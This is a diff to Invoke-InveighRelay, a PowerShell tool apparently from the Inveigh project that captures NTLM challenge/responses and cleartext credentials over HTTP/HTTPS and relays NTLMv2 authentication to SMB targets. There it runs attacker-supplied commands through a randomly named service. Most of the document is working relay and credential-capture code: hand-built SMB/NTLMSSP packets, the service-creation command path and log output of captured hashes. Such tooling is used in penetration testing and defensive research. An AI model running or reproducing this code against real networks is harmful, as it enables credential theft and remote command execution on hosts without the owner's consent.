@@ -2,10 +2,15 @@ Function Invoke-InveighRelay
 {
 <#
 .SYNOPSIS
-Invoke-InveighRelay is the main Inveigh SMB relay function. Invoke-InveighRelay can be used either through Invoke-Inveigh or as a standalone function.
+Invoke-InveighRelay performs NTLMv2 HTTP to SMB relay with psexec style command execution.
 
 .DESCRIPTION
 Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.
+
+    HTTP/HTTPS to SMB NTLMv2 relay with granular control
+    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
+    Granular control of console and file output
+    Can be executed as either a standalone function or through Invoke-Inveigh
 
 .PARAMETER HTTP
 Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
@@ -14,8 +19,11 @@ Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
 Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
 If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.
 
+.PARAMETER HTTPSCertAppID
+Specify a valid application GUID for use with the ceriticate.
+
 .PARAMETER HTTPSCertThumbprint
-Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be inveigh.pfx.
+Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current working directory and named Inveigh.pfx.
 
 .PARAMETER Challenge
 Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.
@@ -52,7 +60,7 @@ Default = Disabled: (Y/N) Enable/Disable real time file output.
 Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
 
 .PARAMETER OutputStreamOnly
-Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
+Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh Relay through a shell that does not return other output streams.
 Note that you will not see the various yellow warning messages if enabled.
 
 .PARAMETER OutputDir
@@ -60,6 +68,9 @@ Default = Working Directory: Set a valid path to an output directory for log and
 
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
+
+.PARAMETER RunTime
+(Integer) Set the run time duration in minutes.
 
 .PARAMETER Tool
 Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
@@ -78,10 +89,9 @@ https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/pow
 
 .LINK
 https://github.com/Kevin-Robertson/Inveigh
-
 #>
 
-# Default parameter values can be modified in this section 
+# Parameter default values can be modified in this section:
 param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
@@ -100,8 +110,10 @@ param
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
     [parameter(Mandatory=$false)][array]$SMBRelayUsernames="",
     [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
+    [parameter(Mandatory=$false)][int]$RunTime="",
     [parameter(Mandatory=$true)][string]$SMBRelayCommand = "", 
-    [parameter(Mandatory=$false)][string]$HTTPSCertThumbprint="76a49fd27011cf4311fb6914c904c90a89f3e4b2",
+    [parameter(Mandatory=$false)][string]$HTTPSCertAppID="00112233-4455-6677-8899-AABBCCDDEEFF",
+    [parameter(Mandatory=$false)][string]$HTTPSCertThumbprint="98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -114,7 +126,8 @@ if(!$SMBRelayTarget)
 {
     Throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
 }
-elseif(!$SMBRelayCommand)
+
+if(!$SMBRelayCommand)
 {
     Throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
 }
@@ -138,11 +151,6 @@ if(!$inveigh)
     $inveigh.SMBRelay_failed_list = @()
 }
 
-if($inveigh.relay_running)
-{
-    Throw "Invoke-InveighRelay is already running, use Stop-Inveigh"
-}
-
 if($inveigh.HTTP_listener.IsListening)
 {
     $inveigh.HTTP_listener.Stop()
@@ -156,6 +164,7 @@ if(!$inveigh.running)
     $inveigh.log_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
+    $inveigh.certificate_application_ID = $HTTPSCertAppID
     $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
     $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.console_output = $false
@@ -164,7 +173,7 @@ if(!$inveigh.running)
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
-    $inveigh.challenge = $Challenge
+    $Inveigh.challenge = $Challenge
 }
 
 $inveigh.relay_running = $true
@@ -215,7 +224,7 @@ else
 if(!$inveigh.running)
 {
     $inveigh.status_queue.add("Inveigh Relay started at $(Get-Date -format 's')")|Out-Null
-    $inveigh.log.add("$(Get-Date -format 's') - Inveigh started") |Out-Null
+    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay started")]) |Out-Null
 
     if($HTTP -eq 'y')
     {
@@ -236,10 +245,13 @@ if(!$inveigh.running)
             $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
             $certificate_store.Open('ReadWrite')
             $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
-            $certificate.Import($PWD.Path + "\inveigh.pfx")
+            $certificate.Import($PWD.Path + "\Inveigh.pfx")
             $certificate_store.Add($certificate) 
             $certificate_store.Close()
-            Invoke-Expression -command ("netsh http add sslcert ipport=0.0.0.0:443 certhash=" + $inveigh.certificate_thumbprint + " appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'") > $null
+            $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
+            $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
+            $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
+            & "netsh" $netsh_arguments > $null
             $inveigh.status_queue.add("HTTPS Capture Enabled")|Out-Null
         }
         catch
@@ -294,6 +306,15 @@ if(!$inveigh.running)
     else
     {
         $inveigh.status_queue.add("Real Time File Output Disabled")|Out-Null
+    }
+
+    if($RunTime -eq 1)
+    {
+        $inveigh.status_queue.add("Run Time = $RunTime Minute")|Out-Null
+    }
+    elseif($RunTime -gt 1)
+    {
+        $inveigh.status_queue.add("Run Time = $RunTime Minutes")|Out-Null
     }
 }
 
@@ -365,7 +386,7 @@ if($inveigh.status_output)
     }
 }
 
-$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
+$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |Select-Object -expand id
 $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
 $process_ID = $process_ID -replace "-00-00",""
 [Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}
@@ -534,11 +555,19 @@ $SMB_relay_response_scriptblock =
         {
             $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
         }
-        
-        $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 244)
-        $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 248)
-        $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 252)
-        $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length - 256)
+
+        $SMB_length_1 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 12))
+        $SMB_length_1 = $SMB_length_1 -replace "-00-00",""
+        $SMB_length_1 = $SMB_length_1.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_length_2 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 8))
+        $SMB_length_2 = $SMB_length_2 -replace "-00-00",""
+        $SMB_length_2 = $SMB_length_2.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_length_3 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 4))
+        $SMB_length_3 = $SMB_length_3 -replace "-00-00",""
+        $SMB_length_3 = $SMB_length_3.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_NTLMSSP_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
+        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length -replace "-00-00",""
+        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 16))
         $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
         $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
@@ -548,6 +577,10 @@ $SMB_relay_response_scriptblock =
         $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 86))
         $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
         $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        [array]::Reverse($SMB_length_1)
+        [array]::Reverse($SMB_length_2)
+        [array]::Reverse($SMB_length_3)
+        [array]::Reverse($SMB_NTLMSSP_length)
         [array]::Reverse($SMB_netbios_length)
         
         $j = 0
@@ -563,17 +596,17 @@ $SMB_relay_response_scriptblock =
                 + $SMB_blob_length`
                 + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                 + $SMB_byte_count`
-                + (0xa1,0x82,0x01)`
+                + (0xa1,0x82)`
                 + $SMB_length_1`
-                + (0x30,0x82,0x01)`
+                + (0x30,0x82)`
                 + $SMB_length_2`
-                + (0xa2,0x82,0x01)`
+                + (0xa2,0x82)`
                 + $SMB_length_3`
-                + (0x04,0x82,0x01)`
+                + (0x04,0x82)`
                 + $SMB_NTLMSSP_length`
                 + $HTTP_request_bytes`
                 + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
-            
+
             $SMB_relay_response_stream.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
         	$SMB_relay_response_stream.Flush()
             
@@ -620,17 +653,17 @@ $SMB_relay_execute_scriptblock =
 
         $SMB_relay_failed = $false
         $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
-        $SMB_service_random = [String]::Join("00-", (1..20 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
+        $SMB_service_random = [String]::Join("00-", (1..20 | ForEach-Object {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
         $SMB_service = $SMB_service_random -replace "-00",""
         $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
         $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
         $SMB_service_random += '00-00-00'
         [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        $SMB_referent_ID_bytes = [String](1..4 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+        $SMB_referent_ID_bytes = [String](1..4 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
         $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
-        [System.Text.Encoding]::ASCII.GetBytes($SMBRelayCommand) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }
+        [System.Text.Encoding]::UTF8.GetBytes($SMBRelayCommand) | ForEach-Object { $SMB_relay_command += "{0:X2}-00-" -f $_ }
 
         if([bool]($SMBRelayCommand.length%2))
         {
@@ -928,7 +961,7 @@ $HTTP_scriptblock =
         }
         else
         {
-            $HTTP_challenge_bytes = [String](1..8 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
             $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
             $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         }
@@ -1173,7 +1206,7 @@ $HTTP_scriptblock =
                                 }
                                 else
                                 {
-                                    $inveigh.console_queue.add("NTLMv1 relay not yet supported")
+                                    $inveigh.console_queue.add("NTLMv1 SMB relay not yet supported")
                                     $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")])
                                     $inveigh.SMB_relay_active_step = 0
                                     $SMB_relay_socket.Close()
@@ -1218,7 +1251,74 @@ $HTTP_scriptblock =
         $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
         $HTTP_stream.close()
 
-        if(!$inveigh.running -and $inveigh.file_output)
+    }
+
+    $inveigh.HTTP_listener.Stop()
+    $inveigh.HTTP_listener.Close()
+}
+
+$control_relay_scriptblock = 
+{
+    param ($RunTime)
+
+    if($RunTime)
+    {    
+        $control_timeout = new-timespan -Minutes $RunTime
+        $control_stopwatch = [diagnostics.stopwatch]::StartNew()
+    }
+       
+    while ($inveigh.relay_running)
+    {
+
+        if($RunTime)
+        {    
+            if($control_stopwatch.elapsed -ge $control_timeout)
+            {
+                if($inveigh.HTTP_listener.IsListening)
+                {
+                    $inveigh.HTTP_listener.Stop()
+                    $inveigh.HTTP_listener.Close()
+                }
+            
+                $inveigh.console_queue.add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
+                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
+                Start-Sleep -m 5
+                $inveigh.relay_running = $false
+
+                if($inveigh.HTTPS)
+                {
+                    & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
+        
+                    try
+                    {
+                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                        $certificate_store.Open('ReadWrite')
+                        $certificate = $certificate_store.certificates.find("FindByThumbprint",$inveigh.certificate_thumbprint,$false)[0]
+                        $certificate_store.Remove($certificate)
+                        $certificate_store.Close()
+                    }
+                    catch
+                    {
+                        if($inveigh.status_output)
+                        {
+                            $inveigh.console_queue.add("SSL Certificate Deletion Error - Remove Manually")
+                        }
+
+                        $inveigh.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
+
+                        if($inveigh.file_output)
+                        {
+                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File $Inveigh.log_out_file -Append   
+                        }
+                    }
+                }     
+
+                $inveigh.HTTP = $false
+                $inveigh.HTTPS = $false
+            }
+        }
+
+        if($inveigh.file_output -and (!$inveigh.running -or !$inveigh.bruteforce_running))
         {
             while($inveigh.log_file_queue.Count -gt 0)
             {
@@ -1237,13 +1337,17 @@ $HTTP_scriptblock =
                 $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                 $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
             }
+
+            while($inveigh.cleartext_file_queue.Count -gt 0)
+            {
+                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
+                $inveigh.cleartext_file_queue.RemoveRange(0,1)
+            }
         }
 
+        Start-Sleep -m 5
     }
-
-    $inveigh.HTTP_listener.Stop()
-    $inveigh.HTTP_listener.Close()
-}
+ }
 
 # HTTP/HTTPS Listener Startup Function 
 Function HTTPListener()
@@ -1276,13 +1380,32 @@ Function HTTPListener()
         $SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument(
         $SMBRelayAutoDisable).AddArgument($SMBRelayNetworkTimeout).AddArgument(
         $MachineAccounts).AddArgument($WPADAuth) > $null
-    $HTTP_handle = $HTTP_powershell.BeginInvoke()
+    $HTTP_powershell.BeginInvoke() > $null
+}
+
+# Control Relay Startup Function
+Function ControlRelayLoop()
+{
+    $control_relay_runspace = [runspacefactory]::CreateRunspace()
+    $control_relay_runspace.Open()
+    $control_relay_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
+    $control_relay_powershell = [powershell]::Create()
+    $control_relay_powershell.Runspace = $control_relay_runspace
+    $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
+    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($RunTime) > $null
+    $control_relay_powershell.BeginInvoke() > $null
 }
 
 # HTTP Server Start
 if($inveigh.HTTP -or $inveigh.HTTPS)
 {
     HTTPListener
+}
+
+# Control Relay Loop Start
+if($RunTime -or $inveigh.file_output)
+{
+    ControlRelayLoop
 }
 
 if(!$inveigh.running -and $inveigh.console_output)
@@ -1301,33 +1424,31 @@ if(!$inveigh.running -and $inveigh.console_output)
             {
                 switch -wildcard ($inveigh.console_queue[0])
                 {
-                    "*local administrator*"
+                    "Inveigh *exited *"
                     {
                         write-warning $inveigh.console_queue[0]
                         $inveigh.console_queue.RemoveRange(0,1)
                     }
-                    "*NTLMv1 challenge/response written*"
+                    "* written to *"
                     {
-                    if($inveigh.file_output)
-                    {
-                        write-warning $inveigh.console_queue[0]
-                    }
+                        if($inveigh.file_output)
+                        {
+                            write-warning $inveigh.console_queue[0]
+                        }
+
                         $inveigh.console_queue.RemoveRange(0,1)
                     }
-                    "*NTLMv2 challenge/response written*"
-                    {
-                    if($inveigh.file_output)
-                    {
-                        write-warning $inveigh.console_queue[0]
-                    }
-                        $inveigh.console_queue.RemoveRange(0,1)
-                    }
-                    "* relay *"
+                    "* for relay *"
                     {
                         write-warning $inveigh.console_queue[0]
                         $inveigh.console_queue.RemoveRange(0,1)
                     }
-                    "Service *"
+                    "*SMB relay *"
+                    {
+                        write-warning $inveigh.console_queue[0]
+                        $inveigh.console_queue.RemoveRange(0,1)
+                    }
+                    "* local administrator *"
                     {
                         write-warning $inveigh.console_queue[0]
                         $inveigh.console_queue.RemoveRange(0,1)
@@ -1361,38 +1482,71 @@ Function Stop-Inveigh
 {
     <#
     .SYNOPSIS
-    Stop-InveighRelay will stop all running Inveigh functions.
+    Stop-Inveigh will stop all running Inveigh functions.
     #>
     if($inveigh)
     {
-        if($inveigh.running -or $inveigh.relay_running)
+        if($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running)
         {
-            $inveigh.running = $false
-            $inveigh.relay_running = $false
-            
+
             if($inveigh.HTTP_listener.IsListening)
             {
                 $inveigh.HTTP_listener.Stop()
                 $inveigh.HTTP_listener.Close()
             }
-
-            $inveigh.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
-            $inveigh.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null
-
-            if($inveigh.file_output)
+            
+            if($inveigh.bruteforce_running)
             {
-                "$(Get-Date -format 's') - Inveigh exited"| Out-File $Inveigh.log_out_file -Append
+                $inveigh.bruteforce_running = $false
+                $inveigh.status_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")|Out-Null
+                $inveigh.HTTP_listener.server.blocking = $false
+                Start-Sleep -s 1
+                $inveigh.HTTP_listener.server.Close()
+                Start-Sleep -s 1
+                $inveigh.HTTP_listener.Stop()
+                $inveigh.status_queue.add("Inveigh Brute Force exited at $(Get-Date -format 's')")|Out-Null
+                $inveigh.log.add("$(Get-Date -format 's') - Inveigh Brute Force exited")|Out-Null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh Brute Force exited"| Out-File $Inveigh.log_out_file -Append
+                }
+            }
+            
+            if($inveigh.relay_running)
+            {
+                $inveigh.relay_running = $false
+                $inveigh.status_queue.add("Inveigh Relay exited at $(Get-Date -format 's')")|Out-Null
+                $inveigh.log.add("$(Get-Date -format 's') - Inveigh Relay exited")|Out-Null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh Relay exited"| Out-File $Inveigh.log_out_file -Append
+                }
             } 
+
+            if($inveigh.running)
+            {
+                $inveigh.running = $false
+                $inveigh.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
+                $inveigh.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh exited"| Out-File $Inveigh.log_out_file -Append
+                }
+            } 
+
         }
         else
         {
-            $inveigh.status_queue.add("Inveigh isn't running") | Out-Null
+            $inveigh.status_queue.add("There are no running Inveigh functions") | Out-Null
         }
     
         if($inveigh.HTTPS)
         {
-            Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
-        
+            & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
+
             try
             {
                 $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
@@ -1419,7 +1573,7 @@ Function Stop-Inveigh
     }
     else
     {
-        $inveigh.status_queue.add("Inveigh isn't running")|Out-Null
+        $inveigh.status_queue.add("There are no running Inveigh functions")|Out-Null
     }
 
     if($inveigh.status_output)
@@ -1435,7 +1589,7 @@ Function Stop-Inveigh
             {
                 switch -wildcard ($inveigh.status_queue[0])
                 {
-                    "Inveigh exited at *"
+                    "Inveigh *exited *"
                     {
                         write-warning $inveigh.status_queue[0]
                         $inveigh.status_queue.RemoveRange(0,1)
@@ -1473,33 +1627,31 @@ Function Get-Inveigh
         {
             switch -wildcard ($inveigh.console_queue[0])
             {
-                "*local administrator*"
+                "Inveigh *exited *"
                 {
                     write-warning $inveigh.console_queue[0]
                     $inveigh.console_queue.RemoveRange(0,1)
                 }
-                "*NTLMv1 challenge/response written*"
+                "* written to *"
                 {
-                if($inveigh.file_output)
-                {
-                    write-warning $inveigh.console_queue[0]
-                }
+                    if($inveigh.file_output)
+                    {
+                        write-warning $inveigh.console_queue[0]
+                    }
+
                     $inveigh.console_queue.RemoveRange(0,1)
                 }
-                "*NTLMv2 challenge/response written*"
-                {
-                if($inveigh.file_output)
-                {
-                    write-warning $inveigh.console_queue[0]
-                }
-                    $inveigh.console_queue.RemoveRange(0,1)
-                }
-                "* relay *"
+                "* for relay *"
                 {
                     write-warning $inveigh.console_queue[0]
                     $inveigh.console_queue.RemoveRange(0,1)
                 }
-                "Service *"
+                "*SMB relay *"
+                {
+                    write-warning $inveigh.console_queue[0]
+                    $inveigh.console_queue.RemoveRange(0,1)
+                }
+                "* local administrator *"
                 {
                     write-warning $inveigh.console_queue[0]
                     $inveigh.console_queue.RemoveRange(0,1)
@@ -1512,6 +1664,15 @@ Function Get-Inveigh
             }
         }    
     }
+}
+
+Function Get-InveighCleartext
+{
+    <#
+    .SYNOPSIS
+    Get-InveighCleartext will get all captured cleartext credentials.
+    #>
+    $inveigh.cleartext_list
 }
 
 Function Get-InveighNTLM
@@ -1548,7 +1709,7 @@ Function Get-InveighNTLMv1
     {
         $inveigh.NTLMv1_list.sort()
 
-        foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
+        ForEach($unique_NTLMv1 in $inveigh.NTLMv1_list)
         {
             $unique_NTLMv1_account = $unique_NTLMv1.substring(0,$unique_NTLMv1.indexof(":",($unique_NTLMv1.indexof(":")+2)))
 
@@ -1590,7 +1751,7 @@ Function Get-InveighNTLMv2
     {
         $inveigh.NTLMv2_list.sort()
 
-        foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
+        ForEach($unique_NTLMv2 in $inveigh.NTLMv2_list)
         {
             $unique_NTLMv2_account = $unique_NTLMv2.substring(0,$unique_NTLMv2.indexof(":",($unique_NTLMv2.indexof(":")+2)))
 
@@ -1617,7 +1778,7 @@ Function Get-InveighLog
     $inveigh.log
 }
 
-Function Get-InveighStats
+Function Get-InveighStat
 {
     <#
     .SYNOPSIS
@@ -1636,12 +1797,12 @@ Function Watch-Inveigh
     #>
     if($inveigh.tool -ne 1)
     {
-        if($inveigh.running -or $inveigh.relay_running)
+        if($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running)
         {
             Write-Output "Press any key to stop real time console output"
             $inveigh.console_output = $true
 
-            :console_loop while(($inveigh.running) -and ($inveigh.console_output))
+            :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
             {
                 while($inveigh.console_queue.Count -gt 0)
                 {
@@ -1653,34 +1814,32 @@ Function Watch-Inveigh
                     else
                     {
                         switch -wildcard ($inveigh.console_queue[0])
-                        {
-                            "*local administrator*"
+                        {  
+                            "Inveigh *exited *"
                             {
                                 write-warning $inveigh.console_queue[0]
                                 $inveigh.console_queue.RemoveRange(0,1)
                             }
-                            "*NTLMv1 challenge/response written*"
+                            "* written to *"
                             {
-                            if($inveigh.file_output)
-                            {
-                                write-warning $inveigh.console_queue[0]
-                            }
+                                if($inveigh.file_output)
+                                {
+                                    write-warning $inveigh.console_queue[0]
+                                }
+
                                 $inveigh.console_queue.RemoveRange(0,1)
                             }
-                            "*NTLMv2 challenge/response written*"
-                            {
-                            if($inveigh.file_output)
-                            {
-                                write-warning $inveigh.console_queue[0]
-                            }
-                                $inveigh.console_queue.RemoveRange(0,1)
-                            }
-                            "* relay *"
+                            "* for relay *"
                             {
                                 write-warning $inveigh.console_queue[0]
                                 $inveigh.console_queue.RemoveRange(0,1)
                             }
-                            "Service *"
+                            "*SMB relay *"
+                            {
+                                write-warning $inveigh.console_queue[0]
+                                $inveigh.console_queue.RemoveRange(0,1)
+                            }
+                            "* local administrator *"
                             {
                                 write-warning $inveigh.console_queue[0]
                                 $inveigh.console_queue.RemoveRange(0,1)
@@ -1722,7 +1881,7 @@ Function Clear-Inveigh
     #>
     if($inveigh)
     {
-        if(!$inveigh.running -and !$inveigh.relay_running)
+        if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.bruteforce_running)
         {
             Remove-Variable inveigh -scope global
             Write-Output "Inveigh data has been cleared from memory"
